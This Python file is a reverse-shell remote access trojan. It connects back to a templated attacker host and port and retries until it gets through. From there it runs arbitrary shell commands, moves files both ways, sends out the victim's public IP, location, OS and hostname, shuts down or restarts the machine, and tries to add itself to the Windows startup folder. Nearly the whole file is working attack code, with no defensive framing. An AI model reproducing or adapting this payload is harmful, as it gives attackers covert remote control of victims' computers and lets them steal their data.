import socket
import subprocess
import os
import time
import webbrowser
import platform
import urllib.request
import json
import os
from io import BytesIO

# Connecting Target To Attacker

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Try Until Not Connected
    connected = False
    while (connected == False):
        try:
            
            # Note: Please Place Attacker's IP Here
            s.connect(('{args.lhost}', {args.lport}))

            # Connected
            connected = True

            # Sending Current Working Directory Of Target To Attacker
            cwd = os.getcwd()
            s.send(("dir:" + str(cwd)).encode('utf-8'))
            
        except:
            # If Failed To Connect, Print A Dot And Try Again
            print(".", end="")

    while True:
        try:
            # Recieve Command From Attacker
            command = s.recv(2048).strip().decode('utf-8')

            # Terminate Script
            if 'terminate' in command:
                s.close()
                break 

            elif 'trollsploit.fbi_openup' in command:
                url = 'https://www.youtube.com/watch?v=ScUAiJj6D5M'
                webbrowser.get().open(url)

            elif 'sysctl.restart' in command:
                try:
                    os.system('shutdown /r')
                except:
                    'null'

            elif 'trollsploit.rickroll' in command:
                try:
                    url = 'https://www.youtube.com/watch?v=xvFZjo5PgG0'
                    webbrowser.get().open(url)
                except:
                    'null'

            elif 'data.ip' in command:
                try:
                    csocket = s.accept()
                    public_ip = urllib.request.urlopen('https://api.ipify.org/').read().decode('utf-8')
                    csocket.send(public_ip.encode('utf-8'))
                except:
                    return 'null'

            elif 'commands' in command:
                message = '''
                +========================================================+
                                    Data Exfiltration
                    [1] data.location               # Locates The Targets Where abouts
                    [2] data.ip                     # Shows The Targets IP Adress
                    [3] data.core                   # Shows The Users CPU
                    [4] data.os                     # Shows The Targets Machine OS
                    [5] data.hostname               # Shows The Target Computes Hostname
                    [6] data.mac                    # Shows The Computers MAC Address
        
                +=========================================================+
                                        TrollSploit
                    [1] trollsploit.rickroll        # Opens Browser And Plays Rick Ashley Never Gonna Give You Up
                    [2] trollsploit.fbi_openup      # Plays Funny FBI Open Up Loli Dnace x3

                +=========================================================+
                                        System Control
                    [1] sysctl.shutdown             #Shuts Down Computer 
                    [4] sysctl.restart              # Restarts Computer
                '''
                s.send(message.encode('utf-8'))

            elif 'data.location' in command:
                try:
                    data = urllib.request.urlopen('https://freegeoip.app/json/').read().decode('utf-8')
                    json_data = json.loads(data)
                    country_name = json_data['country_name']
                    city = json_data['city']
                    message = f'[+] Current Location: ' + country_name +  city
                    s.send(message.encode('utf-8'))
                    s.close()
                except:
                    'null'

            elif 'data.ip' in command:
                try:
                    data = urllib.request.urlopen('https://api.ipify.org/').read().decode('utf-8')
                    s.send(data.encode('utf-8'))
                    s.close()
                except:
                    'null'

            elif 'data.os' in command:
                try:
                    message = platform.system()
                    s.send(message.encode('utf-8'))
                    s.close()
                except:
                    'null'

            elif 'sysctl.shutdown' in command:
                try:
                    os.system('shutdown now')
                except:
                    'null'

            elif 'data.core' in command:
                try:
                    message = platform.machine()
                    s.send(message.encode('utf-8'))
                    s.close()
                except:
                    'null'

            elif 'data.hostname' in command:
                try:
                    message = socket.getfqdn(socket.gethostname()).strip()
                    s.send(message.encode('utf-8'))
                    s.close()
                except:
                    'null'

            elif 'sysctl.shutdown' in command:
                try:
                    os.system('shutdown now')
                except:
                    'null'

            elif 'sysctl.restart' in command:
                try:
                    os.system('reboot')
                except:
                    'null'


            # Grabbing Files
            # Example: grab picture.jpg
            elif command.startswith('download'):

                # Extracting filename From Command
                # Skipping 1st Five Characters
                # Because They Are 'g', 'r', 'a', 'b', ' '
                file_name = command[5:]

                # Getting File Size
                file_size = os.path.getsize(file_name)

                # Sending File Name
                s.send(file_name.encode('utf-8'))

                # Recieving Response From Target
                # e.g., OK Response
                s.recv(1024).decode('utf-8')

                # Sending File Size
                s.send(str(file_size).encode('utf-8'))

                # Recieving Response
                s.recv(1024).decode('utf-8')

                # Opening File To Read
                # File Will Be Sent In Small Chunks Of Data
                with open(file_name, "rb") as file:

                    # Chunks Sent = 0
                    c = 0
                    
                    # Starting Time
                    start_time = time.time()

                    # Running Loop Until c < file_size
                    while c < file_size:

                        # Read 1024 Bytes
                        data = file.read(1024)

                        # If No Bytes, Stop
                        if not (data):
                            break

                        # Send Bytes
                        s.sendall(data)

                        # Chunks Sent += Length Of Data
                        c += len(data)

                    # Ending Time
                    end_time = time.time()

            # Transfer File From Attacker To Target
            # Example: video.mp4
            elif 'upload' in command:

                # Recieving Name Of File To Be Transferred
                file_name = s.recv(1024).decode('utf-8')

                # Sending Response
                s.send('OK'.encode('utf-8'))

                # Recieving Size Of File To Be Transferred
                file_size = s.recv(1024).decode('utf-8')

                # Sending Response
                s.send('OK'.encode('utf-8'))

                # Opening File For Writing
                with open(file_name, "wb") as file:

                    # Chunks Recieved
                    c = 0
                    
                    # Starting Time
                    start_time = time.time()

                    # Running Until c < int(file_size)
                    while c < int(file_size):

                        # Recieve 1024 Bytes
                        data = s.recv(1024)

                        # If No Data, Stop
                        if not (data):
                            break

                        # Write Bytes To File
                        file.write(data)

                        # Chunks Added
                        c += len(data)

                    # Ending Time
                    end_time = time.time()

            # Changing Working Directory Of Target
            # Example: D:/
            elif command.startswith('cd '):

                # Extracting Directory
                # Skipping 3 Characters
                # They Are 'c', 'd', ' '
                dir = command[3:]

                # Change Directory
                try:
                    os.chdir(dir)

                except:
                    # If Failed, Revert
                    os.chdir(cwd)

                # Get Updated Working Directory
                cwd = os.getcwd()
                
                # Send Updated Directory To Attacker
                s.send(("dir:" + str(cwd)).encode('utf-8'))

            # Putting File In Startup Folder
            # Only Works For Windows
            # Example: starup T.py
            elif command.startswith('startup'):

                # Extracting Filename
                file_name = command[8:]

                # Extracting Path Of File
                # As File Is In Current Working Directory
                # Get Current Working Directory
                pth = os.getcwd()

                # Put File In Startup
                try:
                    AddToStartup(file_name, pth)

                    # Send OK To Attacker
                    s.send("OK".encode('utf-8'))

                # If Failed, Send Exception Message To Attacker
                except Exception as e:
                    s.send(str(e).encode('utf-8'))

            # Otherwise The Command Will Be Considered As CMD OR Terminal Command
            # Command Will Be Executed In Terminal
            else:
                # Executing Command
                CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

                # If Command Executes Succefully
                # Get Output Of Command
                out = CMD.stdout.read()

                # If Error Occured
                # Get Error Of Command
                err = CMD.stderr.read()

                # Send Output
                s.send(out)

                # Send Error
                s.send(err)

                # Some Commads Are Executed Successfully, But
                # They Don't Have Any Output
                # For Example: del file.ext
                # Above Command On Execution Doesn't Show Any Output
                # Put Our Attacker Is Alwayes Looking For Output
                # So, If There Is No Output And No Error
                # Send OK
                if (out == b'' and err == b''):
                    s.send("OK".encode('utf-8'))
                    
        # If Attacker Command Was Unable To Be Executed
        except Exception as e:

            # Send Exception Message To Attacker
            s.send(str(e).encode('utf-8'))


# Start Of Script
# If Connection Breaks
# Script Tries To Connect Again And Again


connected = False
while (not connected):
    try:
        connect()
        connected = True
    except:
        print(".", end = "")